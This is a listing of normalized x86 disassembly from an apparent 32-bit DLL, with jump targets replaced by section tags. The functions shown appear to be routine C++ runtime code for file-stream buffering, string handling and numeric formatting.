movzx eax bl
push eax
call sub_10011354
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
pop ebx
retn 0x4
mov eax ebx
jmp r-xdata
sub_100042db
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x14 ]
mov edi eax
or eax 0xffffffff
cmp edi eax
je r-xdata
mov edx [ esi + 0x30 ]
mov eax [ eax ]
mov edx [ edx ]
add edx eax
cmp eax edx
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x8 ]
mov eax edi
movzx eax [ ecx ]
pop esi
retn
sub_10004317
push 0x5c
mov eax sub_10026cf3
call sub_1001427c
mov esi ecx
mov eax [ esi + 0x20 ]
mov eax [ eax ]
xor edi edi
mov [ ebp - 0x38 ] esi
cmp eax edi
je r-xdata
mov eax [ esi + 0x4c ]
cmp eax edi
jne r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x30 ]
mov eax [ eax ]
mov ecx [ ecx ]
add ecx eax
cmp eax ecx
jae r-xdata
cmp [ esi + 0x3c ] edi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov esi [ esi + 0x20 ]
mov eax [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
movzx eax [ eax ]
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0xf
call sub_10001ca7
mov [ ebp - 0x4 ] edi
push [ esi + 0x4c ]
call sub_100113c6
pop ecx
cmp eax 0xffffffff
je r-xdata
push eax
call sub_100113c6
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_100142ff
retn
or esi 0xffffffff
add esi 0x44
mov [ ebp - 0x40 ] esi
movzx eax al
jmp r-xdata
xor edi edi
inc edi
cmp eax edi
jle r-xdata
lea eax [ ebp - 0x2d ]
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x3c ] eax
jne r-xdata
cmp eax 0x3
jne r-xdata
lea eax [ ebp - 0x58 ]
call sub_1000950f
mov esi eax
call sub_100055bf
mov esi [ ebp - 0x18 ]
sub esi [ ebp - 0x34 ]
add esi eax
jmp r-xdata
lea eax [ ebp - 0x60 ]
call sub_1000950f
mov esi eax
call sub_100055bf
mov ecx [ ebp - 0x34 ]
sub ecx eax
push ecx
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10001c38
cmp [ ebp - 0x18 ] edi
jb r-xdata
test esi esi
jg r-xdata
xor ebx ebx
push eax
inc ebx
lea edi [ ebp - 0x2c ]
call sub_100047d5
lea eax [ ebp - 0x48 ]
mov ecx edi
call sub_1000950f
mov esi eax
call sub_100055bf
mov edi [ ebp - 0x18 ]
mov ebx eax
lea eax [ ebp - 0x68 ]
lea ecx [ ebp - 0x2c ]
call sub_1000950f
mov esi eax
call sub_100055bf
mov ecx [ ebp - 0x38 ]
mov ecx [ ecx + 0x3c ]
mov edx [ ecx ]
lea esi [ ebp - 0x3c ]
push esi
lea esi [ ebp - 0x2c ]
push esi
lea esi [ ebp - 0x2d ]
push esi
lea esi [ ebp - 0x34 ]
push esi
add edi ebx
push edi
push eax
push [ ebp - 0x40 ]
call [ edx + 0x10 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x38 ]
push [ eax + 0x4c ]
call sub_100113c6
pop ecx
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebp - 0x50 ]
lea ecx [ ebp - 0x2c ]
call sub_1000950f
push edi
mov esi eax
call sub_100055bf
push eax
lea eax [ ebp - 0x2d ]
push edi
push eax
call sub_10010bad
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x38 ]
push [ eax + 0x4c ]
mov eax [ ebp - 0x34 ]
dec esi
movsx eax [ esi + eax ]
push eax
call sub_10011354
pop ecx
pop ecx
movzx esi [ ebp - 0x2d ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000197b
mov eax esi
jmp r-xdata
sub_100044c7
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
push edi
lea edi [ esi + 0x40 ]
xor ebx ebx
cmp [ eax ] edi
jne r-xdata
cmp [ esi + 0x4c ] ebx
je r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
call sub_10004ac1
test al al
je r-xdata
cmp [ esi + 0x3c ] ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
dec [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0x4c ]
call sub_10011554
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_100115d9
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ esi + 0x20 ]
cmp [ eax ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov ecx [ esi + 0x44 ]
mov [ eax ] ebx
mov [ eax + 0x10 ] ecx
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x41 ]
mov [ ecx ] eax
mov ecx esi
sub ecx eax
mov eax [ esi + 0x30 ]
add ecx 0x41
mov [ eax ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_10004588
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
mov eax [ ebp + 0x14 ]
push ebx
push esi
mov esi ecx
mov [ esp + 0xc ] eax
mov eax [ ebp + 0x18 ]
xor ebx ebx
push edi
mov edi [ ebp + 0xc ]
mov [ esp + 0x14 ] eax
cmp [ esi + 0x4c ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
call sub_10004ac1
test al al
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_10011647
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp edi ebx
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_100115d9
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x1
push edi
push [ esi + 0x4c ]
call sub_10011554
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
mov [ esi + 0x44 ] eax
mov eax [ esi + 0x20 ]
lea ecx [ esi + 0x40 ]
cmp [ eax ] ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov ecx [ esi + 0x44 ]
mov [ eax ] ebx
mov [ eax + 0x10 ] ecx
jmp r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] ecx
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x41 ]
mov [ ecx ] eax
mov ecx esi
sub ecx eax
mov eax [ esi + 0x30 ]
add ecx 0x41
mov [ eax ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
sub_1000465c
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
xor ecx ecx
cmp eax ecx
je r-xdata
xor eax eax
cmp [ esp + 0x8 ] ecx
jne r-xdata
push [ esp + 0xc ]
push ecx
push [ esp + 0x10 ]
push eax
call sub_1001168c
add esp 0x10
test eax eax
jne r-xdata
cmp [ esp + 0xc ] ecx
jne r-xdata
push edi
mov edi [ esi + 0x4c ]
push 0x1
call sub_10004a7d
mov eax esi
pop edi
jmp r-xdata
push 0x4
pop ecx
pop esi
retn 0x8
sub_100046a3
push esi
mov esi ecx
cmp [ esi + 0x4c ] 0x0
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
push 0xffffffff
call [ eax + 0x4 ]
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x4c ]
call sub_10011914
pop ecx
test eax eax
jge r-xdata
or eax 0xffffffff
pop esi
retn
sub_100046ce
push esi
push edi
push [ esp + 0xc ]
mov edi ecx
call sub_10006b90
mov esi eax
mov eax [ esi ]
pop ecx
mov ecx esi
call [ eax + 0x4 ]
test al al
je r-xdata
mov eax edi
mov [ edi + 0x3c ] esi
call sub_10005446
and [ edi + 0x3c ] 0x0
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_1000471d
push esi
push edi
lea edi [ ecx - 0xc ]
lea esi [ edi + 0xc ]
mov ecx esi
call sub_100039e2
push esi
mov [ esi ] r--data
call sub_1000fec1
test [ esp + 0x10 ] 0x1
pop ecx
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push edi
call sub_10010ba2
pop ecx
sub_1000476a
push esi
push edi
lea edi [ ecx - 0x54 ]
lea esi [ edi + 0x54 ]
mov ecx esi
call sub_10003fba
push esi
mov [ esi ] r--data
call sub_1000fec1
test [ esp + 0x10 ] 0x1
pop ecx
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push edi
call sub_10010ba2
pop ecx
sub_100047d5
or eax 0xffffffff
sub eax [ edi + 0x14 ]
cmp eax ebx
ja r-xdata
test ebx ebx
jbe r-xdata
call sub_1000f9c4
mov eax edi
retn 0x4
push esi
mov esi [ edi + 0x14 ]
push 0x0
add esi ebx
push esi
mov ecx edi
call sub_10001cc3
test al al
je r-xdata
pop esi
mov dl [ esp + 0x8 ]
mov ecx [ edi + 0x14 ]
push ebx
mov eax edi
call sub_10005342
push esi
mov ecx edi
call sub_10001ca7
sub_10004819
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi eax
mov eax [ esi + 0x10 ]
push edi
mov edi [ esi + 0xc ]
mov ecx eax
sub ecx edi
test ecx 0xfffffff8
jne r-xdata
cmp edi eax
jbe r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
mov eax [ esi ]
je r-xdata
call sub_10010b92
push [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x10 ]
push esi
call sub_1000560c
mov edi [ esi + 0xc ]
cmp edi [ esi + 0x10 ]
jbe r-xdata
call sub_10010b92
cmp [ ebp + 0x10 ] eax
je r-xdata
mov esi [ esi ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
test esi esi
jne r-xdata
call sub_10010b92
mov ebx [ ebp + 0x14 ]
sub ebx edi
sar ebx 0x3
mov eax [ esi ]
jmp r-xdata
call sub_10010b92
xor eax eax
lea edi [ edi + ebx * 8 ]
cmp edi [ eax + 0x10 ]
ja r-xdata
call sub_10010b92
test esi esi
je r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edi
pop edi
pop esi
mov [ eax ] ecx
pop ebx
leave
retn 0x10
cmp edi [ esi + 0xc ]
jae r-xdata
sub_100048be
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
push esi
push ebx
call sub_10007295
add esp 0x14
lea eax [ ebx + esi * 8 ]
pop edi
leave
retn 0x4
sub_100048e4
push 0x44
mov eax sub_100274db
call sub_1001427c
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
xor ebx ebx
mov edi ecx
mov [ ebp - 0x4c ] edi
mov [ ebp - 0x50 ] ebx
test dl 0x2
jne r-xdata
test dl 0x4
jne r-xdata
mov ecx [ eax + 0x24 ]
cmp [ ecx ] ebx
je r-xdata
xor eax eax
mov [ ebp - 0x30 ] 0x7
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x44 ] ax
lea eax [ ebp - 0x48 ]
push eax
mov esi edi
mov [ ebp - 0x4 ] 0x2
call sub_10001738
lea esi [ ebp - 0x48 ]
mov ecx [ eax + 0x20 ]
cmp [ ecx ] ebx
je r-xdata
mov ecx [ ecx ]
mov edx [ eax + 0x3c ]
cmp edx ecx
jb r-xdata
mov edx [ eax + 0x30 ]
mov ecx [ ecx ]
mov edx [ edx ]
mov eax [ eax + 0x10 ]
mov eax [ eax ]
lea ecx [ ecx + edx * 2 ]
sub ecx eax
sar ecx 0x1
push ecx
push eax
lea esi [ ebp - 0x2c ]
call sub_1000559b
mov eax esi
mov esi [ ebp - 0x4c ]
xor edi edi
inc edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10001738
push ebx
push edi
lea esi [ ebp - 0x2c ]
call sub_10001a52
mov eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ eax + 0x14 ]
mov eax [ eax ]
sub ecx eax
sar ecx 0x1
push ecx
push eax
lea esi [ ebp - 0x2c ]
call sub_1000559b
mov eax esi
push eax
mov esi edi
mov [ ebp - 0x4 ] ebx
call sub_10001738
lea esi [ ebp - 0x2c ]
jmp r-xdata
mov ecx edx
call sub_100142ff
retn 0x4
push ebx
push 0x1
call sub_10001a52
mov eax edi
sub_100049bc
push 0x0
mov eax sub_10027b5d
call sub_10014213
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
xor eax eax
push 0x40
push 0x22
push [ ebp + 0x8 ]
call sub_1000ff45
add esp 0xc
test eax eax
je r-xdata
push 0x1
mov edi eax
mov esi ebx
call sub_10004a7d
lea esi [ ebp + 0x8 ]
mov eax ebx
call sub_10005437
and [ ebp - 0x4 ] 0x0
push eax
call sub_10006b90
mov esi eax
mov eax [ esi ]
pop ecx
mov ecx esi
call [ eax + 0x4 ]
test al al
je r-xdata
mov eax ebx
mov [ ebx + 0x3c ] esi
call sub_10005446
and [ ebx + 0x3c ] 0x0
jmp r-xdata
call sub_100142eb
retn 0x4
lea ecx [ ebp + 0x8 ]
call sub_100086e3
mov eax ebx
jmp r-xdata
sub_10004a34
push ecx
push ebx
xor ebx ebx
push edi
mov edi esi
cmp [ esi + 0x4c ] ebx
je r-xdata
xor edi edi
mov ecx esi
call sub_10004ac1
test al al
jne r-xdata
push [ esi + 0x4c ]
call sub_100119e7
pop ecx
test eax eax
je r-xdata
xor edi edi
mov eax esi
mov [ esi + 0x48 ] bl
mov [ esi + 0x41 ] bl
call sub_10005446
mov eax [ rw-data ]
mov [ esi + 0x44 ] eax
mov eax edi
pop edi
mov [ esi + 0x4c ] ebx
mov [ esi + 0x3c ] ebx
pop ebx
pop ecx
retn
sub_10004a7d
cmp [ esp + 0x4 ] 0x1
mov [ esi + 0x41 ] 0x0
sete al
mov [ esi + 0x48 ] al
mov eax esi
call sub_10005446
test edi edi
je r-xdata
mov eax [ rw-data ]
and [ esi + 0x3c ] 0x0
mov [ esi + 0x4c ] edi
mov [ esi + 0x44 ] eax
retn 0x4
lea eax [ edi + 0x8 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
lea eax [ edi + 0x4 ]
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
sub_10004ac1
push 0x54
mov eax sub_10027117
call sub_1001427c
mov edi ecx
cmp [ edi + 0x3c ] 0x0
mov [ ebp - 0x38 ] edi
je r-xdata
mov al 0x1
cmp [ edi + 0x41 ] 0x0
je r-xdata
mov eax [ edi ]
push 0xffffffff
call [ eax + 0x4 ]
cmp eax 0xffffffff
jne r-xdata
push 0x8
pop esi
lea eax [ ebp - 0x30 ]
call sub_100047b7
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x44 ]
mov [ ebp - 0x3c ] eax
xor al al
jmp r-xdata
mov [ edi + 0x41 ] 0x0
dec eax
je r-xdata
call sub_100142ff
retn
cmp [ edi + 0x41 ] 0x0
je r-xdata
lea eax [ ebp - 0x50 ]
lea ecx [ ebp - 0x30 ]
call sub_1000950f
mov esi eax
call sub_100055bf
push [ edi + 0x4c ]
push ebx
push 0x1
push eax
call sub_100111e1
add esp 0x10
cmp ebx eax
jne r-xdata
lea eax [ ebp - 0x58 ]
lea ecx [ ebp - 0x30 ]
call sub_1000950f
mov esi eax
call sub_100055bf
mov ebx [ ebp - 0x34 ]
sub ebx eax
je r-xdata
dec eax
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
test ebx ebx
jne r-xdata
xor bl bl
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000197b
mov al bl
jmp r-xdata
lea eax [ ebp - 0x48 ]
lea ecx [ ebp - 0x30 ]
call sub_1000950f
mov esi eax
call sub_100055bf
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x60 ]
lea ecx [ ebp - 0x30 ]
call sub_1000950f
mov esi eax
call sub_100055bf
mov ecx [ edi + 0x3c ]
mov edx [ ecx ]
lea esi [ ebp - 0x34 ]
push esi
mov esi [ ebp - 0x40 ]
add ebx esi
push ebx
push eax
push [ ebp - 0x3c ]
call [ edx + 0x18 ]
sub eax 0x0
je r-xdata
push ebx
push 0x8
pop ebx
lea edi [ ebp - 0x30 ]
call sub_100047d5
mov edi [ ebp - 0x38 ]
jmp r-xdata
sub_10004bdc
push 0x54
mov eax sub_1002749e
call sub_1001427c
mov edi [ ebp + 0x14 ]
test [ edi + 0x10 ] 0x4000
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x3c ] esi
jne r-xdata
lea esi [ ebp - 0x30 ]
mov eax edi
call sub_10008382
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10006c2c
pop ecx
mov ecx esi
mov [ ebp - 0x34 ] eax
call sub_100086e3
xor eax eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x28 ] ax
mov ecx [ ebp - 0x34 ]
xor esi esi
inc esi
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x4 ] esi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ eax + 0x1c ]
mov eax esi
jmp r-xdata
call sub_1000601f
mov [ ebp - 0x4 ] 0x3
call sub_10006036
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_100142ff
retn 0x18
mov [ ebp - 0x30 ] ebx
cmp eax [ ebp - 0x18 ]
jbe r-xdata
push 0xffffffff
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100019c6
push ebx
push esi
lea esi [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001a52
mov eax [ edi + 0x18 ]
cmp eax ebx
jle r-xdata
cmp [ ebp - 0x14 ] 0x8
mov eax [ ebp - 0x28 ]
jae r-xdata
push [ ebp - 0x30 ]
lea esi [ ebp - 0x44 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10005fe5
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x10
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x30 ] ebx
sub eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x44 ] ecx
cmp eax ebx
jbe r-xdata
lea eax [ ebp - 0x28 ]
mov eax [ edi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
push [ ebp - 0x30 ]
mov eax [ ebp - 0x44 ]
push [ ebp + 0x18 ]
mov [ ebp + 0x10 ] esi
push esi
mov esi [ ebp - 0x3c ]
push eax
mov [ ebp + 0xc ] eax
mov [ edi + 0x18 ] ebx
call sub_10005fe5
add esp 0x10
push ebx
push 0x1
lea esi [ ebp - 0x2c ]
call sub_10001a52
mov eax [ ebp - 0x3c ]
mov eax [ ebp - 0x38 ]
movzx edx [ eax ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x44 ] 0x1
mov ecx esi
call sub_10007a82
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec [ ebp - 0x34 ]
add [ ebp - 0x38 ] 0x2
cmp [ ebp - 0x34 ] ebx
ja r-xdata
sub_10004d50
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x5c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov edx [ esi + 0x10 ]
push edi
push [ ebp + 0x10 ]
mov ebx r--data
push [ ebp + 0xc ]
lea edi [ esp + 0x20 ]
push [ ebp + 0x1c ]
mov [ esp + 0x20 ] ecx
mov [ esp + 0x1c ] eax
call sub_10005da3
push eax
lea eax [ esp + 0x30 ]
push 0x40
push eax
call sub_10011a63
add esp 0x10
push eax
push [ ebp + 0x18 ]
lea edx [ esp + 0x30 ]
push [ esp + 0x20 ]
mov ecx esi
push [ esp + 0x28 ]
call sub_10005e08
mov ecx [ esp + 0x7c ]
mov eax [ esp + 0x28 ]
add esp 0x18
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10010789
mov esp ebp
pop ebp
retn 0x18
sub_10004dd1
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x5c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov edx [ esi + 0x10 ]
push edi
push [ ebp + 0x10 ]
mov ebx r--data
push [ ebp + 0xc ]
lea edi [ esp + 0x20 ]
push [ ebp + 0x1c ]
mov [ esp + 0x20 ] ecx
mov [ esp + 0x1c ] eax
call sub_10005da3
push eax
lea eax [ esp + 0x30 ]
push 0x40
push eax
call sub_10011a63
add esp 0x10
push eax
push [ ebp + 0x18 ]
lea edx [ esp + 0x30 ]
push [ esp + 0x20 ]
mov ecx esi
push [ esp + 0x28 ]
call sub_10005e08
mov ecx [ esp + 0x7c ]
mov eax [ esp + 0x28 ]
add esp 0x18
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10010789
mov esp ebp
pop ebp
retn 0x18
sub_10004e52
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x5c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov edx [ esi + 0x10 ]
push edi
push [ ebp + 0x10 ]
mov ebx r--data
push [ ebp + 0xc ]
lea edi [ esp + 0x20 ]
push [ ebp + 0x20 ]
mov [ esp + 0x20 ] ecx
push [ ebp + 0x1c ]
mov [ esp + 0x20 ] eax
call sub_10005da3
push eax
lea eax [ esp + 0x34 ]
push 0x40
push eax
call sub_10011a63
add esp 0x14
push eax
push [ ebp + 0x18 ]
lea edx [ esp + 0x30 ]
push [ esp + 0x20 ]
mov ecx esi
push [ esp + 0x28 ]
call sub_10005e08
mov ecx [ esp + 0x7c ]
mov eax [ esp + 0x28 ]
add esp 0x18
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10010789
mov esp ebp
pop ebp
retn 0x1c
sub_10004ed6
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x5c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov edx [ esi + 0x10 ]
push edi
push [ ebp + 0x10 ]
mov ebx r--data
push [ ebp + 0xc ]
lea edi [ esp + 0x20 ]
push [ ebp + 0x20 ]
mov [ esp + 0x20 ] ecx
push [ ebp + 0x1c ]
mov [ esp + 0x20 ] eax
call sub_10005da3
push eax
lea eax [ esp + 0x34 ]
push 0x40
push eax
call sub_10011a63
add esp 0x14
push eax
push [ ebp + 0x18 ]
lea edx [ esp + 0x30 ]
push [ esp + 0x20 ]
mov ecx esi
push [ esp + 0x28 ]
call sub_10005e08
mov ecx [ esp + 0x7c ]
mov eax [ esp + 0x28 ]
add esp 0x18
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10010789
mov esp ebp
pop ebp
retn 0x1c
sub_10004f5a
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov [ esp + 0x1c ] ecx
mov ecx [ edi + 0x14 ]
mov [ esp + 0x18 ] eax
mov eax 0x2000
test ecx ecx
jg r-xdata
mov ebx ecx
push 0x24
pop ecx
cmp ebx ecx
mov [ esp + 0x20 ] ecx
jg r-xdata
test [ edi + 0x10 ] eax
jne r-xdata
mov ecx [ edi + 0x10 ]
fld [ ebp + 0x1c ]
sub ebx [ esp + 0x20 ]
and [ esp + 0x10 ] 0x0
and [ esp + 0x14 ] 0x0
mov edx ecx
and edx 0x3000
cmp edx eax
jne r-xdata
mov [ esp + 0x20 ] ebx
push 0x6
pop ecx
push [ ebp + 0x10 ]
xor al al
push [ ebp + 0xc ]
lea esi [ esp + 0x28 ]
push ecx
push ecx
fstp [ esp ]
push [ esp + 0x30 ]
call sub_100058e9
push eax
lea eax [ esp + 0x40 ]
push 0x6c
push eax
call sub_10011a63
add esp 0x18
push eax
push ebx
push [ esp + 0x24 ]
lea edx [ esp + 0x3c ]
push [ esp + 0x24 ]
mov ecx edi
push [ ebp + 0x18 ]
push [ esp + 0x34 ]
push [ esp + 0x3c ]
call sub_10005945
mov ecx [ esp + 0xc0 ]
mov eax [ esp + 0x3c ]
add esp 0x24
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10010789
mov esp ebp
pop ebp
retn 0x1c
fld [ r--data ]
fmul st1
fucomp st1
fnstsw ax
test ah 0x44
jpo r-xdata
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov [ esp + 0xf ] 0x0
fxch st1
fxch st1
mov [ esp + 0xf ] 0x1
fchs
jmp r-xdata
cmp [ esp + 0x10 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop esi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ esp + 0x10 ] esi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0xf ] 0x0
fstp st1
je r-xdata
cmp ebx esi
jl r-xdata
fchs
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp [ esp + 0x14 ] edx
jae r-xdata
sub ebx esi
fmul st1
add [ esp + 0x14 ] esi
jmp r-xdata
sub_100050dd
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov [ esp + 0x1c ] ecx
mov ecx [ edi + 0x14 ]
mov [ esp + 0x18 ] eax
mov eax 0x2000
test ecx ecx
jg r-xdata
mov ebx ecx
push 0x24
pop ecx
cmp ebx ecx
mov [ esp + 0x20 ] ecx
jg r-xdata
test [ edi + 0x10 ] eax
jne r-xdata
mov ecx [ edi + 0x10 ]
sub ebx [ esp + 0x20 ]
and [ esp + 0x10 ] 0x0
and [ esp + 0x14 ] 0x0
mov edx ecx
and edx 0x3000
cmp edx eax
jne r-xdata
mov [ esp + 0x20 ] ebx
push 0x6
pop ecx
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ esp + 0xf ] 0x0
jmp r-xdata
mov [ esp + 0xf ] 0x1
fchs
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop esi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ esp + 0x10 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ esp + 0x10 ] esi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0xf ] 0x0
fstp st1
je r-xdata
cmp ebx esi
jl r-xdata
push [ ebp + 0x10 ]
mov al 0x4c
push [ ebp + 0xc ]
lea esi [ esp + 0x28 ]
push ecx
push ecx
fstp [ esp ]
push [ esp + 0x30 ]
call sub_100058e9
push eax
lea eax [ esp + 0x40 ]
push 0x6c
push eax
call sub_10011a63
add esp 0x18
push eax
push ebx
push [ esp + 0x24 ]
lea edx [ esp + 0x3c ]
push [ esp + 0x24 ]
mov ecx edi
push [ ebp + 0x18 ]
push [ esp + 0x34 ]
push [ esp + 0x3c ]
call sub_10005945
mov ecx [ esp + 0xc0 ]
mov eax [ esp + 0x3c ]
add esp 0x24
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10010789
mov esp ebp
pop ebp
retn 0x1c
fchs
jmp r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
